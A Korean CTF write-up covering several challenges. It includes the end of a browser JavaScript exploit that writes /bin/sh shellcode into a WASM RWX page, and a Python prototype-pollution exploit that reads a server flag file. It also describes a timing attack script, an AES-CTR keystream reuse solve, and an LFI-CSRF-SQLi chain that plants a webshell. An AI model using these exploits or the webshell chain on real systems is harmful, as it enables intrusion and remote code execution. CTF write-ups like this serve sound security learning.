function aaw(addr, value) {
   oob[20] = addr

   if(typeof value == "number") {
      let buf = new BigUint64Array(arb);
      buf[0] = value
   }

   else if(typeof value == "string") {
      let buf = new Uint8Array(arb);
      for(let i = 0; i < value.length; i++) {
         buf[i] = value[i].charCodeAt();
      }
   }
}

let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
     
let wasmFunction = wasmInstance.exports.main;

const Instance = addrof(wasmInstance)
const rwx = aar(addrof(wasmInstance)+0x5Fn)
print("RWX : "+hex(rwx))

let shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x4d\x31\xd2\x0f\x05";

aaw(rwx, shellcode)

wasmFunction()

// while(1); // for debug

// ##END_OF_FILE##
```

## L. input box - Misc

Font의 GSUB을 이용하여 올바른 플래그가 입력되었다면 GOOD 이미지를 출력하는 문제이다.

대충 입력해보면 아스키 범위의 모든 문자들에 어떠한 이미지도 매핑이 되어있지 않은 것을 확인할 수 있다,

otf파일을 ttx로 파싱해서 보면 `G00979`의 width만 다른 것을 알 수 있다.\
따라서 해당 `Glyph`가 플래그의 끝을 의미한다.\
해당 `Glyph`를 포함하는 `Ligature`를 갖고 있는 `LigatureSet`을 찾으면\
`Glyph G00923`를 속성으로 갖는 `LigatureSet`이 `G00979`를 `Component=braceright`인 `Ligature`로 갖고 있다.\
따라서 플래그의 마지막 글자는 `}`

`Glyph G00923`를 포함하는 `Ligature`를 갖고 있는 `LigatureSet`을 찾으면\
`Glyph G00877`를 속성으로 갖는 `LigatureSet`이 `G00923`를 `Component=numbersign`인 `Ligature`로 갖고 있다.\
따라서 플래그의 마지막에서 두번째 글자는 `#`

이러한 반복하면 플래그를 얻을수 있었다.

파싱 코드를 짤 시간에 손으로 구하고 만다는 마인드로 `Ctrl+F`를 이용해서 풀었기 때문에 코드가 없다.

문제의 결은 많이 다르지만 플래그를 읽고 [redpwn 2021에 출제된 misc 문제](https://ctftime.org/task/16443)가 생각이 났다.

## M. pyc - Reversing

pyc 데이터를 갖고있는 파일을 분석하는 컨셉의 문제이다.

우선 주어진 파일을 디스어셈한 후에 디스어셈된 파일을 보면\
`chk`와 `throw`라는 함수가 존재하는 것을 확인할 수 있다.

그 중, `throw`라는 함수가 `chk.__code__` 에다가 m이라는 리스트에 담긴 값으로 xor을 하고 인풋을 인자로 chk을 호출하는 것을 확인할 수 있다.

때문에 아래와 같이 pyc 데이터에 xor하는 스크립트를 작성하였다.

```python
a = bytes.fromhex("74006401 83017D01 74016401 64026702 83017D01 7402A003 7C026403 A102A004 64026403 A1027D02 64047D03 64057D04 64067D05 64077D06 64087D07 74007402 74056409 83018301 83017D08 74068300 7D087407 74067C00 83017408 83024400 5D0B5C02 7D017D09 7C08A009 7C017C09 4100A101 01007130 740A7C08 83015300 290A4E72 57000000 72620000 00DA06") # chk.__code__
m = [0, 0, 16, 0, 255, 1, 254, 0, 16, 0, 124, 1, 231, 3, 35, 2, 222, 53, 0, 0, 0, 0, 0, 0, 0, 2, 24, 2, 221, 3, 196, 6, 115, 2, 225, 1, 184, 2, 25, 1, 197, 6, 0, 1, 24, 5, 25, 4, 24, 7, 248, 7, 125, 7, 1, 4, 24, 9, 25, 3, 99, 0, 16, 7, 98, 5, 91, 9, 255, 3, 231, 5, 255, 0, 101, 8, 16, 3, 149, 0, 67, 8, 54, 7, 16, 0, 60, 0, 231, 6, 53, 8, 35, 6, 32, 2, 57, 8, 253, 0, 106, 1, 1, 9, 0, 9, 196, 11, 107, 1, 24, 9, 196, 2, 184, 1, 22, 0, 12, 48, 5, 2, 0, 8, 208, 1]
print(bytes(i^j for i,j in zip(a,m+[0]*200)).hex())
```

위 스크립트를 실행하여 나온 아웃풋을 다시 손수 hex editor로 넣어주면 chk의 디스어셈된 코드가 바뀐다.\
해당 함수를 hand-ray로 디컴파일하면 아래와 같다

```python
def chk(ipt):
    for i in range(len(ipt)-3):
        r0 = int.from_bytes(ipt[i:i+4], 'little')
        ipt = ipt[:i]+((((r0 >> ((i + 16)%32)) | (r0 << ((-i + 16)%32))) & 0xFFFFFFFF)^0xDEADBEEF).to_bytes(4, 'little')+ipt[i+4:]
    return ipt
```

복잡하지 않은 연산이므로 역연산 코드를 작성하여 플래그를 휙득하였다.

> Solution Script

```python
k = [161, 55, 37, 106, 136, 128, 88, 143, 139, 247, 182, 192, 140, 132, 222, 141, 79, 38, 69, 75, 184, 232, 66, 72, 152, 14, 202, 49, 143, 58, 194, 161, 241, 230, 237, 118, 254, 112, 85, 32, 220, 192, 179, 201, 216, 132, 141, 42, 53]
key = [239, 88, 97, 17, 198, 239, 121, 208, 223, 159, 135, 245, 211, 181, 173, 210, 1, 22, 49, 20, 254, 132, 118, 15, 199, 87, 250, 100, 208, 84, 241, 146, 149, 185, 153, 70, 161, 2, 48, 86, 131, 173, 220, 187, 189, 165, 205, 9, 72]
m = [0, 0, 16, 0, 255, 1, 254, 0, 16, 0, 124, 1, 231, 3, 35, 2, 222, 53, 0, 0, 0, 0, 0, 0, 0, 2, 24, 2, 221, 3, 196, 6, 115, 2, 225, 1, 184, 2, 25, 1, 197, 6, 0, 1, 24, 5, 25, 4, 24, 7, 248, 7, 125, 7, 1, 4, 24, 9, 25, 3, 99, 0, 16, 7, 98, 5, 91, 9, 255, 3, 231, 5, 255, 0, 101, 8, 16, 3, 149, 0, 67, 8, 54, 7, 16, 0, 60, 0, 231, 6, 53, 8, 35, 6, 32, 2, 57, 8, 253, 0, 106, 1, 1, 9, 0, 9, 196, 11, 107, 1, 24, 9, 196, 2, 184, 1, 22, 0, 12, 48, 5, 2, 0, 8, 208, 1]

def dec(ipt):
    for i in list(range(len(ipt)-3))[::-1]:
        r0 = int.from_bytes(ipt[i:i+4], 'little')^0xDEADBEEF
        ipt = ipt[:i]+((((r0 << ((i + 16)%32)) | (r0 >> ((-i + 16)%32))) & 0xFFFFFFFF)).to_bytes(4, 'little')+ipt[i+4:]
    return ipt

ipt = bytes(k)
# ipt = bytes(i^j for i,j in zip(k,key)) # chk function's routine before xor
print(dec(ipt))
```

## N. Leetcode - Misc

파이썬을 코드에 대한 타이밍 공격이 컨셉인 문제이다.

주어진 파이썬 파일을 대충 깔끔하게 정리하면 아래와 같다.
```python
while \
    not (k := k if "k" in vars() else lambda c : __import__("functools").reduce(lambda f, g: lambda x: f(g(f(x))), [lambda x : __import__("hashlib").sha512(x).digest()] * 16, lambda x: x)(c)) or\
    not (s := s if "s" in vars() else __import__("secret").s.hex()) or\
    not (i := input().strip().ljust(16)) or\
    any(any(k(x.encode()) != k(y.encode()) for x, y in zip(s[4 * t: 4 * t + 4], i[4 * t: 4 * t + 4])) for t in __import__("random").sample([0, 1, 2, 3], 4)) or\
    print(open("flag").read()): 
    
    print("🤔", end="")
```

16바이트의 입력을 받고 해당 입력을 4바이트씩 블록으로 쪼갠 후,\
랜덤한 순서의 블록들을 앞에서부터 순차적으로 `secret.hex()`의 동일한 인덱스와 비교한다.

이때 비교를 위해 사용되는 k함수를 호출하면 무수히 많은 sha512의 요청이 쏟아지고\
python은 각 바이트를 비교하는 데에 꽤 많은 시간이 걸린다.

따라서 입력을 날렸을 때 아웃풋이 돌아오기까지\
"좀 오래 걸리는 거 같은데?"\
라는 생각이 들면 맞는 입력을 날린 것이다.

그래서 자동으로 입력을 만들고, 응답시간을 기반으로 맞는 것 같은 문자를 골라주는 스크립트를 작성하려고 했지만\
응답시간을 결정하는 변수가 너무 많았기 떄문에, 이를 정교하게 만드는 것이 어려워 응답시간을 뿌려주고 직접 눈으로 보고 결정할 수 있게끔 스크립트를 작성하였다.

```python
from pwn import *
from itertools import product
from tqdm import tqdm
from time import time

p = remote('host1.dreamhack.games', 9347)
# p = process(['python3', '-u', './chal.py'])
p.sendline('')
p.recv(4)

r = ''
for _ in range(16):
    u = []
    for i in ('0123456789abcdef'[:]):
        g = []
        for j in range(16):
            pay = (r+i)[:4].ljust(4)*4
            p.sendline(pay.encode())
            a = time()
            p.recv(4)
            b = time()
            g.append(b - a)
        print(sorted(g)[-6:],i)

p.interactive()
```

가장 처음 스크립트를 돌릴 때엔\
다른 문자들 대비 응답 시간이 균일하지 않은 문자 4개가 존재한다.

이는 해당 문자들을 비교했을 때 통과가 되어\
다음 바이트에 대한 비교가 이루어졌기 때문에 응답시간의 차이가 발생한 것으로 볼 수 있다.\
따라서 해당 4개의 문자가 각 블록의 첫번째 글자가 된다.

이후 각 블록의 첫번째 글자를 r에 넣어 실행한다.

이때, 랜덤한 비교 순서 때문에\
입력으로 보낸 문자열이 포함된 블록이 `비교되지 않고 끝난 것 같아보이는 시간` 과\
입력으로 보낸 문자열이 포함된 블록이 `비교되고 끝난 것 같아보이는 시간`의 차가\
여러 변수를 고려하고도 다른 문자 대비 큰 문자 하나가 존재한다.

해당 문자 역시 최초 실행과 같은 이유로 올바른 문자라고 생각하여 r 뒤에 추가한다.

위 과정을 반복하면 각각의 블록들을 구할 수 있다.\
이후 블록들의 순서를 적당히 알아내면 플래그를 휙득할 수 있다.

## O. Interchange - Crypto

운용방식 별 AES cipher 3개가 주어지고, 원하는 방식에 encrypt 요청을 보낼 수 있는 문제이다.

CTR로 encrypt를 할 때, 암호화를 할 때마다 동일한 iv를 갖는 cipher를 계속 생성하기 때문에\
아주 긴 `\x00`을 암호화 한 값과 플래그를 암호화 한 값을 xor하여 플래그를 휙득하였다.

> Solution Script

```python
from pwn import *

p = remote('host1.dreamhack.games', 8930)
# p = process(['python3','-u','chal.py'])

while not p.recvline().strip().endswith(b'CTR'):
    p.sendlineafter(b'>> ', b'3')
    p.recvline()

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'>> ', b'\x00'*0x1000)
key = bytes.fromhex(p.recvline().strip().split()[-1].decode())
p.sendlineafter(b'>> ', b'2')
x = bytes.fromhex(p.recvline().strip().split()[-1].decode())

print(xor(x,key)[:])

p.interactive()
```

## Q. NSS - Web

프로토타입 폴루션을 통해 LFI로 연결시키는 컨셉의 문제이다.

개인적으로 오랜만에 재미있게 푼 웹 문제인 것 같다.

우선 서버에는 크게 세 가지의 객체가 존재한다.

```
Users = {}
Users[userid] = {
    userid : "{userid}",
    pass : "{hashed password}",
    workspaces : WORKSPACES,
    base_dir: "{unique tmp path}"
}

WORKSPACES = {}
WORKSPACES[workspace_name] = {}

tokens = {}
tokens[token] = {
    owner: "{userid}",
    expire: EXPIRE_TIME
}
```

그리고 endpoint 중에 아래와 같은 동작을 수행하는 것이 있다.

```js
app.post("/api/users/:userid/:ws", (req, res) => {
    const userid = req.params.userid || "";
    const ws_name = req.params.ws || "";
    const token = req.body.token || "";
    const f_name = req.body.file_name || "";
    const f_path = req.body.file_path.replace(/\./g,'') || "";
    const f_content = req.body.file_content || "";

    if(!userid || !token)
        return res.status(400).json({ok: false, err: "Invalid id or token"});
    if(!check_session(userid, token))
        return res.status(403).json({ok: false, err: "Failed to validate session"});

    const user = users[userid];
    if(!ws_name)
        return res.status(400).json({ok: false, err: "Invalid workspace name"});

    const workspace = user.workspaces[ws_name];
    if(!workspace)
        return res.status(404).json({ok: false, err: "Failed to find workspace"});

    if(!f_name || !f_path)
        return res.status(400).json({ok: false, err: "Invalid file name or path"});

    if(!write_b64_file(path.join(user.base_dir, f_path), f_content))
        return res.status(500).json({ok: false, err: "Internal server error"});

    workspace[f_name] = f_path;
    return res.status(200).json({ok: true});
});
```

함수의 내용을 요약해서  `users[userid].workspaces[ws_name][f_name]`에 원하는 문자열을 넣을 수 있다.\
이 때, ws_name을 검증하지 않으므로 `workspace['__proto__'][f_name]`형태로 만들 수 있다.\
따라서 해당 함수에서 prototype pollution이 발생한다.

PP를 이용해서 이뤄야할 목표는 아래 함수를 통해 `/usr/src/app/flag`를 읽는 것이다.

```js
app.get("/api/users/:userid/:ws/:fname", (req, res) => {
    const userid = req.params.userid || "";
    const ws_name = req.params.ws || "";
    const f_name = req.params.fname || "";
    const token = req.body.token || "";

    if(!userid || !token)
        return res.status(400).json({ok: false, err: "Invalid userid or token"});
    if(!check_session(userid, token))
        return res.status(403).json({ok: false, err: "Failed to validate session"});

    const user = users[userid];
    if(!ws_name)
        return res.status(400).json({ok: false, err: "Invalid workspace name"});
    
    const workspace = user.workspaces[ws_name];
    if(!workspace)
        return res.status(404).json({ok: false, err: "Failed to find workspace"});

    if(!f_name)
        return res.status(400).json({ok: false, err: "Invalid file name"});

    const f_path = workspace[f_name];
    if(!f_path)
        return res.status(404).json({ok: false, err: "Failed to find file"});

    const content = read_b64_file(path.join(user.base_dir, f_path));
    if(typeof content == "undefined")
        return res.status(500).json({ok: false, err: "Internal server error"});

    res.status(200).json({ok: true, file_content: content});
});
```

그래서 내가 생각한 시나리오는 아래와 같았다.

1. userid로 `__proto__`를 줘서 `users[__proto__]`를 부르게 한다.
2. ws_name도 `__proto__`를 줘서 `users[__proto__].workspaces[__proto__]`를 부르게 한다.
3. f_name으로 아무거나 줘서 `user[__proto__].workspaces[__proto__][f_name]`이 `flag`를 반환하게 한다.
4. PP로 `user[__proto__].base_dir`이 `/usr/src/app`을 반환하게 한다.

따라서 현재까지의 시나리오를 위해 만들어야 할 값은 아래와 같다.

* `{}.__proto__.workspace = "asdf"` -> `users[__proto__].workspaces`가 `undefined`가 되지 않도록
* `{}.__proto__.asdf = "flag"` -> `user[__proto__].workspaces[__proto__][f_name]`이 `flag`를 반환하도록
* `{}.__proto__.base_dir = "/usr/src/app"` -> `user[__proto__].base_dir`이 `/usr/src/app`을 반환하도록

그런데 코드를 조금 더 살펴보면 문제가 있다.\
9번째 줄의 분기를 통과하는 token을 만들어야 한다.

```js
if(!check_session(userid, token))
    return res.status(403).json({ok: false, err: "Failed to validate session"});
```

`check_session` 함수는 다음과 같다.

```js
function check_session(userid, token) {
    const sess = tokens[token]
    if(!sess) return false;
    if(sess.owner != userid) return false;
    if(sess.expire < Date.now() / 1000){
        tokens.delete(token);
        return false;
    }
    else return true;
}
```

해당 함수 또한 PP를 이용해서 통과하기 위해 token을 `__proto__`로 줬을 때의 필요한 조건을 생각하였다.

1. `tokens[__proto__].owner`가 `__proto__`를 반환
2. `tokens[__proto__].owner`가 매우 큰 정수를 반환

위 두 조건을 만족하면 통과할 수 있는데\
1번 조건은 `{}.__proto__.owner = "__proto__"`를 줘서 쉽게 넘어갈 수 있다.

2번 조건은 `{digit 문자열} < {정수}` 식이 `{정수} < {정수}`로 인식되는 점을 이용해서\
`{}.__proto__.expire = "999999999999999"`를 줘서 넘어갈 수 있다.

위의 PP를 모두 만들고 파일을 부르면 플래그를 얻을 수 있다.

> Solution Script

```python
import requests
from base64 import b64decode

URL = "http://host2.dreamhack.games:12391/api"
# URL = "http://localhost:8888/api"

proto_user = "__proto__"
user = "qqq"
pw = "asdfasdfasdf"
ws = "__proto__"

print(requests.post(URL + "/users", json={"userid":user,"pass":pw}).json())
c = requests.post(URL + "/users/auth", json={"userid":user,"pass":pw}).json()
print(c)
token = c['token']

### users[qqq].workspaces["__proto__"].expire = "99999999999999999999999999"
c = requests.post(URL + f"/users/{user}/__proto__", json={"userid":user,"token":token,"file_name":"expire","file_content":"zzlol","file_path":"99999999999999999999999999"}).json() 
print(c)

### users[qqq].workspaces["__proto__"].owner = "__proto__"
c = requests.post(URL + f"/users/{user}/__proto__", json={"userid":user,"token":token,"file_name":"owner","file_content":"zzlol","file_path":"__proto__"}).json()
print(c)

### users[qqq].workspaces["__proto__"].workspaces = "asdfasdfasdf"
c = requests.post(URL + f"/users/{user}/__proto__", json={"userid":user,"token":token,"file_name":"workspaces","file_content":"zzlol","file_path":"asdfasdfasdf"}).json()
print(c)

### users[qqq].workspaces["__proto__"].zzzzzz = "flag"
c = requests.post(URL + f"/users/{user}/__proto__", json={"userid":user,"token":token,"file_name":"zzzzzz","file_content":"zzlol","file_path":"flag"}).json()
print(c)

### users[qqq].workspaces["__proto__"].base_dir = "/usr/src/app"
c = requests.post(URL + f"/users/{user}/__proto__", json={"userid":user,"token":token,"file_name":"base_dir","file_content":"zzlol","file_path":"/usr/src/app"}).json()
print(c)

### get(users.__proto__.base_dir + users.__proto__.workspaces.__proto__.zzzzzz)
### == get("/usr/src/app/flag")
c = requests.get(URL + "/users/__proto__/__proto__/zzzzzz", json={"userid":'__proto__',"token":'__proto__',"ws_name":"123"}).json()
print(c)

print(b64decode(c['file_content']).decode())
```

## R. billionaire - Blockchain

Contract를 배포하는 트랜젝션의 디테일 페이지에 들어가면, 플래그 데이터가 담긴 storage를 확인할 수 있다.

휙득한 데이터를 solidity 코드에 맞게 xor해주면 플래그를 휙득할 수 있다.


## T. Legendary - Crypto

Legendre PRF 문제이다.

어느 깃허브 [레포지토리](https://github.com/cryptolu/LegendrePRF)에 이더리움 바운티가 걸린 Legendre PRF를 풀기 위한 솔브 코드가 작성되어 있었다.

해당 레포의 `solve.cpp`를 주어진 문제에 맞게 적당히 수정하여 컴파일 한 후 실행하면 플래그를 휙득할 수 있었다.

## U. Legendary - Revenge - Crypto

[T](#t-legendary---crypto)에서 `prime`의 비트 수가 많아지고, output이 줄어들었다.

때문에, 동일한 방법으로 풀이를 하려고 시도했다.

하지만 많은 메모리가 필요해서 vm환경에서는 실행할 수 없는데\
어떠한 원인에서인지 Host OS 환경에서는 제대로 실행이 되지 않아서\
서버 호스팅을 하는 친구의 남는 자원을 빌려서 32코어, 32GB의 램을 가진 인스턴스를 받았다.

16스레드로를 주고 10분간 돌린 결과 플래그를 휙득할 수 있었다.

풀고난 직후에는 너무 많은 컴퓨팅 파워가 필요한게 아닌가 싶었지만\
조금 생각해보니까 아무래도 내 풀이가 의도되지 않은 자원 박치기인 것 같았다.\
의도되진 않았더라도 코드를 보고 분석해서 수정했다면 조금 더 적은 자원으로도 풀 수 있지 않았을까하는 생각이 든다.

## V. ColorfulMemo - Web

해당 문제는 3개의 웹 취약점을 연계해서 웹쉘을 만드는 컨셉의 문제였다.\
사용된 취약점은 `LFI`, `CSRF`, `SQLi`이다.

우선 `index.php`를 보면
```php
<?php
    $path = $_GET["path"];
    if($path == ""){
        $path = "main";
    }
    $path = "./".$path.".php";
?>
...(중략)...
<?php include_once $path; ?>
```
위와 같은 GET 파라미터로 날아온 `path`값에 아무런 검증 없이 `./`와 `.php`를 붙여서 include를 해준다.
따라서 위 부분에서 LFI가 발생한다.

글을 write할 때, `style` 태그에 큰 제약 없이 아무거나 쓸 수 있다.\
이때 `black;background-image:URL(URL)`방식으로 csrf를 트리거할 수 있게 된다.

또, `check.php`를 살펴보면
```php
<?php
if($_SERVER["REMOTE_ADDR"] == '127.0.0.1' || $_SERVER["REMOTE_ADDR"] == '::1'){
    $id = $_GET['id'];
    $mysqli = new mysqli('localhost','user','password','colorfulmemo');
    // I believe admin
    $result = $mysqli->query('SELECT adminCheck FROM memo WHERE id = '.$id);

...(후략)
?>
```
만약 클라이언트의 주소가 로컬 호스트인 경우에\
GET 파라미터로 날리는 `id`를 이용해서 SQL injection이 가능하다.

그런데 `my.cnf`파일에 `secure-file-priv= /tmp/`가 있으므로\
`/tmp` 디렉토리에 파일을 읽고 쓸수 있다. 

그래서 생각한 시나리오는 다음과 같다.

1. write할 때 color에 `black;background-image:URL("/?path=check.php&id={적절한 /tmp/asdf.php 웹쉘 업로드 구문}")`을 준다.\
2. 그리고 해당 글을 리포트하면 CSRF -> SQLi가 발생해서 `/tmp/asdf.php`에 웹쉘이 만들어진다.\
3. `/?path=../../../tmp/asdf.php`에 접속한다.

위 시나리오대로 플래그를 휙득할 수 있었다.

## 후기

작년 FIESTA 이후로 대회 시간이 긴 CTF는 꽤 간만에 하는 것 같았다.\
긴 CTF를 하면 시간을 많이 박아도 부담이 없어서 좋지만\
순위 유지에 그만큼 시간이 더 들어서 힘이 드는 것 같다.

모쪼롬 많이 얻어가고 재미있게 했던 CTF였다.